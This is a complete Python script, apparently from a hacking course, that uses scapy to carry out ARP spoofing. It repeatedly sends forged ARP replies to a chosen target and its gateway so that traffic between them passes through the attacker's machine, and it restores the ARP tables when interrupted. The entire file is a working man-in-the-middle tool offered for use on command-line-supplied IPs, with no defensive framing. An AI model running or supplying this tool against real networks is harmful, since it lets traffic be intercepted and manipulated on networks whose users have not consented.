import scapy.all as scapy
import time
import optparse


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # scapy.ls(scapy.ARP())

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scapy.ls(scapy.Ether())

    all_packet = broadcast / arp_request
    answered_list = scapy.srp(all_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    # scapy.ls(scapy.ARP())
    scapy.send(arp_response, verbose=False)


def reset_operation(fooled_ip, gw_ip):
    fooled_mac = get_mac(fooled_ip)
    gw_mac = get_mac(gw_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gw_ip, hwsrc=gw_mac)
    # scapy.ls(scapy.ARP())
    scapy.send(arp_response, verbose=False, count=6)


def get_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gw", dest="gw_ip", help="Enter GW IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")
    if not options.gw_ip:
        print("Enter GW IP")

    return options


user_ips = get_input()
user_target_ip = user_ips.target_ip
user_gw_ip = user_ips.gw_ip

number = 0
try:
    while True:
        arp_poisoning(user_target_ip, user_gw_ip)
        arp_poisoning(user_gw_ip, user_target_ip)

        number += 2
        print("\rSending packets " + str(number), end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip, user_gw_ip)
    reset_operation(user_gw_ip, user_target_ip)
